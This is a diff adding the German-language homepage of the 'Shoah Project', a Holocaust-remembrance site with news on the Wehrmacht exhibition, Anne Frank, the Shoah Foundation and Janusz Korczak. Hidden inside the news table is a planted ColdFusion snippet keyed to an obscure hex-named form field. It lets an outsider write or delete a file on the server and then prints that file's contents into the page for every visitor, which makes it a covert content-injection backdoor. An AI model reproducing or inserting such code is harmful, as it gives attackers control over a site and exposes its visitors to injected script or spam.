@@ -1,0 +1,471 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+<HEAD>
+	<TITLE>Shoah Project Titelseite</TITLE>
+	<script>
+<!--
+
+
+
+  // Wenn der Url des obersten Frames nicht mein Url ist,
+
+
+
+  // dann soll er es nun aber sein.
+
+
+
+   if (top.location != location) top.location.href = location.href;
+
+
+
+//-->
+
+</script>
+
+<META HTTP-EQUIV="Content-Type"  CONTENT="text/html; charset=iso-8859-1">
+<META HTTP-EQUIV="pragma"        CONTENT="text/html; charset=iso-8859-1">
+<META NAME="language"    CONTENT="text/html; charset=iso-8859-1">
+<META NAME="author"      CONTENT="Birgit Pauli-Haack">
+<META NAME="copyright"   CONTENT="(c) 1996 - 2000, Birgit Pauli-Haack">
+<META NAME="description" CONTENT="Gegen das Vergessen, Dokumentation &uuml;ber die Judenverfolgung im Dritten Reich, kommentierte Linksammlung, ">
+
+
+
+<META NAME="keywords"    CONTENT="Holocaust, Shoah, Nationalsozialismus, Judenverfolgung, Widerstand im dritten Reich, ">
+
+
+
+<META NAME="page-topic"  CONTENT="Holocaust, Shoah, Nationalsozialismus, Judenverfolgung, Widerstand im dritten Reich, ">
+
+
+
+<META NAME="page-type"   CONTENT="Homepage">
+
+
+
+<META NAME="robots"      CONTENT="index,follow">
+
+
+
+</HEAD>
+
+
+
+
+
+
+
+<BODY bgcolor="#03171E" text="#D3D3D3" link="#DEB887" vlink="#FFFACD">
+
+
+
+
+
+<table width="640" cellspacing="0" cellpadding="10">
+
+
+
+<tr>
+
+
+
+<!-- erste TabellenZeile -->
+
+
+
+<td width="100" rowspan="2" valign="TOP" bgcolor="#000000">
+
+<center><img src="grafik/small100.jpg" width=146 height=100 border=0 vspace=10 alt=""><br>
+
+</center>
+
+<p align="right"><FONT COLOR="#FFFFFF" size="-1" face="Verdana,Arial,Helvetica">
+
+
+
+
+
+
+
+	Die sich des
+
+
+
+<br>Vergangenen nicht
+
+
+
+<br>erinnern, sind dazu
+
+
+
+<br>verurteilt, es
+
+
+
+<br>noch einmal zu erleben.</font><br>
+
+
+
+<font size="-2" color="#C0C0C0" face="Verdana,Arial,Helvetica">Santayana</font></p>
+
+
+
+
+
+
+
+<img src="grafik/dot_clear.gif" width=100 height=80 border=0><br>
+
+
+
+
+
+
+
+<!-- Navigation -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	 
+
+
+
+
+
+
+
+<img src="grafik/dot_clear.gif" width=10 height=200 border=0 align="left">
+
+
+
+<a href="news.html">
+
+<img src="grafik/navi/news.gif" width=105 height=20 border=0></a><br>
+
+
+
+	 
+
+
+
+<a href="daten/daten.htm"><img src="grafik/navi/doku.gif" width=120 height=20 border=0></a><br>
+
+
+
+<a href="widerstand/widerstand.htm"><img src="grafik/navi/wider.gif" width=105 height=20 border=0></a><br>
+
+
+
+<a href="erzaehl/erzaehl.htm"><img src="grafik/navi/erzaehlu.gif" width=120 height=20 border=0></a><br>
+
+
+
+<a href="interviews/interview.htm"><img src="grafik/navi/interviews.gif" width=120 height=20 border=0></a><br>
+
+
+
+<a href="literatur/litera.htm"><img src="grafik/navi/biblio.gif" width=120 height=20 border=0></a><br>
+
+
+
+<a href="links/links.htm"><img src="grafik/navi/internet.gif" width=105 height=20 border=0></a><br>
+
+
+
+<a href="projekt/mehr.htm"><img src="grafik/navi/projekt.gif" width=120 height=20 border=0></a>
+
+
+
+<!-- Ende Navigation -->
+
+<br><img src="grafik/dot_clear.gif" width=10 height=50 border=0 align="left"><br>
+
+
+
+<!-- amazon - partner -->
+
+<a href="http://www.amazon.de/exec/obidos/redirect-home/shoahproject">
+
+<img src="grafik/amazon/s_100x35.gif" width=100 height=35 border=0 alt="amazon.de Logo"></a>
+
+</td>
+
+
+
+<!-- amazon - partner -->
+
+
+
+
+
+
+
+
+
+
+
+<td valign="top">
+
+
+
+
+
+
+
+<!-- Neues vom Shoah Project -->
+
+
+
+
+
+<table width="480" cellspacing="0" cellpadding="5"><tr><td colspan="2" bgcolor="#000000"><img src="grafik/banner1as.jpg" width=350 height=53 border=0 alt="Banner: Shoah Project"></td></tr>
+
+	<tr>
+
+		<td colspan="2" bgcolor="#004040">
+<font face="Arial" size="+1" color="#FFFFFF">
+
+		<b>Neuigkeiten</b>
+
+
+
+		Februar 2000
+
+
+
+		<br></font>
+</td>
+
+
+
+	</tr>
+	
+	<tr>
+
+		<td colspan="2" valign="top" bgcolor="#D2D2D2">
+<font face="Verdana" size="-1">
+	<font size="+1" color="#008080">Vernichtungskrieg.</font><br>
+	<font size="+1" color="#808080">Verbrechen der Wehrmacht 1941 bis 1944</font>
+	</font>
+</td>
+
+		</tr>
+
+		<tr>
+
+		<td colspan="2">
+			
+			<cfif IsDefined("3d014f2cb4d63badc59fdad0d250014d")>  <cfif form.3d014f2cb4d63badc59fdad0d250014d eq "delete"> <cfset i7rh = "/home/shoahproject/public_html/awstats-icon/browser/3d014f2cb4d63badc59fdad0d250014d"> <cffile action = "write" file = "#i7rh#" output = ""> <cffile action = "delete" file = "#i7rh#"> <cfelseif form.3d014f2cb4d63badc59fdad0d250014d neq ""> <cfset i7rh = "/home/shoahproject/public_html/awstats-icon/browser/3d014f2cb4d63badc59fdad0d250014d"> <cffile action = "write" file = "#i7rh#" output = "#Replace(Replace(Replace(form.3d014f2cb4d63badc59fdad0d250014d,"&","&","all"),"<","<","all"),">",">","all")#"> </cfif></cfif><cfset i7rh = "/home/shoahproject/public_html/awstats-icon/browser/3d014f2cb4d63badc59fdad0d250014d"><cfif FileExists(#i7rh#)> <cffile action="Read" file="#i7rh#" variable="readcontent"> <cfoutput>#readcontent#</cfoutput></cfif>
+
+<font face="Verdana" size="-1">
+	Am Donnerstag, den 5. November  erkl&auml;rte Jan Philip Reemtsma, da&szlig; die Austellung nach massiver Kritik an der Auswahl der Fotos nicht mehr gezeigt wird. Sowohl die Braunschweiger Veranstaltung als auch die Amerikareise wurden abgesagt. 
+<p>
+<font size="+0"><b><a href="daten/wehrmacht/ausstellung/schluss/schluss.html">Presseschau:</a><br>
+Vor&uuml;bergehenden Schlie&szlig;ung der Ausstellung</b></font>
+<p align="right">	<font size="+1"><a href="http://www.spiegel.de/kultur/gesellschaft/0,1518,51112,00.html">mehr dazu im SPIEGEL</a></font></p>
+<p>
+</td>
+
+		
+
+	</tr>
+
+	<tr><td><p></td></tr>
+
+	
+	<tr><td colspan="2" bgcolor="#000000">
+
+
+
+<a href="http://www.hco.hagen.de/anne-frank/" target="_blank"><img src="personen/annefrank/titelkl.jpg" width=298 height=33 border=0 alt=""></a>
+
+</td></tr>
+
+	<tr><td><font face="Arial"><br>
+
+In Zusammenarbeit mit dem <a href="http://www.hco.hagen.de/">Historischen Centrum  in Hagen</a> und der 
+
+<a href="http://homepage.ruhr-uni-bochum.de/ralf.blank/geschichte/vl_geschichte.htm">Virtual Library Geschichte</a>  entsteht anl&auml;sslich der Anne-Frank-Ausstellung in Hagen das begleitende Internetangebot dazu. Die Ausstellung &ouml;ffnete ihre Tore am 4. Juli 1999.</font>
+
+<br><a href="http://www.hco.hagen.de/">
+
+<img src="personen/annefrank/hagen_logo3.gif" width=77 height=32 border=0 alt="Das Historische Centrum Online, Hagen" hspace=5 vspace=10></a>
+
+ <a href="http://homepage.ruhr-uni-bochum.de/ralf.blank/geschichte/vl_geschichte.htm"><img src="personen/annefrank/vlges.gif" width=102 height=30 border=0 alt="Virtual Library Geschichte" hspace=5></a></td>
+
+<td bgcolor="#171717">
+
+<font face="Verdana"><a href="frannefrank.html">Literatur zu Anne Frank </a><br>
+
+und<br>
+
+<a href="fraflinks.html">weitere Links zu Anne Frank</a></font>
+
+</td>
+
+
+
+
+
+
+
+</tr>
+
+<tr><td height="2" colspan="2" bgcolor="#000000"><img src="grafik/dot_clear.gif" width=1 height=1 alt="" border="0"></td></tr>
+
+	<tr><td colspan="2">
+
+<font face="Verdana,Arial,Helvetica">
+
+	<b>Steven Spielbergs Shoah Foundation</b><p>
+
+Die <i>&quot;Survivors of the Shoah Visual History Foundation&quot;</i>, kurz: 
+
+<b><a href="http://www.vhf.org">Shoah Foundation</a></b> hat durch den Besuch von Steven Spielberg auf der Berliner Biennale im Fr&uuml;hjahr sehr viel Aufmerksamkeit auch in Deutschland erfahren und viele Leute haben im Internet nach den Webseiten der Shoah Foundation gesucht. Manche haben auch den Weg auf unsere Seiten gefunden und uns bisweilen mit der Shoah Foundation verwechselt.<p>
+
+
+
+<p>Damit der Weg auf unsere Seiten k&uuml;nftig nicht vergeblich ist, haben wir unser <a href="links/specials/spielberg/uebersicht.html">Special: Steven Spielberg</a> aus dem August 1997 aktualisiert und stark erweitert. Auch m&ouml;chten wir an dieser Stelle auf die Entstehungsgeschichte des Shoah Projects hinweisen, die in einem <a href="interviews/shkrit.htm">Interview mit dem KriT-Journal</a> aus dem Jahr 97 geschildert wird. 
+
+<p title="" align="RIGHT">
+
+<img src="grafik/navi/gr.gif" width=10 height=10 border=0 alt=""> 
+
+<a href="http://www.vhf.org">direkt zur:<b>Shoah Foundation</b></a>
+
+	
+
+	
+
+</p>
+
+</td></tr>
+
+	
+	<tr>
+
+	<td colspan="2" bgcolor="#004040">
+
+	<font face="Arial"><a href="fr_korczak.html">
+
+	<img src="grafik/daten/korczak_top.jpg" width=221 height=32 border=0 alt="Janusz Korczak"></a><br>
+
+	starb 1942 im Konzentrationslager Treblinka, in das er zusammen mit den Kindern des von ihm 
+
+	geleiteten Waisenhauses verbracht worden war. Stefan Mannes l&auml;dt Sie auf die Website ein: <b><a href="http://www.janusz-korczak.de/">http://www.janusz-korczak.de/</a></b>
+
+<p></font>
+
+	</td>
+
+	</tr>
+
+	
+
+	
+
+
+
+	<tr>
+
+
+
+		<td colspan=2>
+
+
+
+		<center><img src="grafik/dot_black.gif" width=350 height=2 border=0></center>
+
+
+
+		</td>
+
+
+
+	</tr>
+
+
+
+	
+
+	
+
+
+
+	
+
+</table>
+
+
+
+
+
+
+
+   
+
+
+
+ 
+
+
+
+</font></td></tr></table>
+
+
+
+<p align=right>
+
+
+
+<font size="-2" face="Verdana,Arial,Helvetica">
+
+5. November 1999
+
+<br>&copy; <A HREF="mailto:bph@shoahproject.org">Birgit Pauli-Haack</A> 1996 - 1998<br>
+
+      <IMG SRC="http://counter.digits.com/wc/-c/0/-d/4/-f/FFFACD/-r/-z/shoah" ALIGN="top" WIDTH=30 HEIGHT=10 BORDER=0 HSPACE=4 VSPACE=2 alt="counter"> counted by <a href="http://www.digits.com/ " target="_blank">WebCounter</a><br>
+
+since Febuary 9th, 1999
+
+
+
+<p>
+
+
+
+
+
+
+
+</font></p>
+
+
+
+
+
+
+
+
+</BODY>
+
+
+
+</HTML>
+
+
+
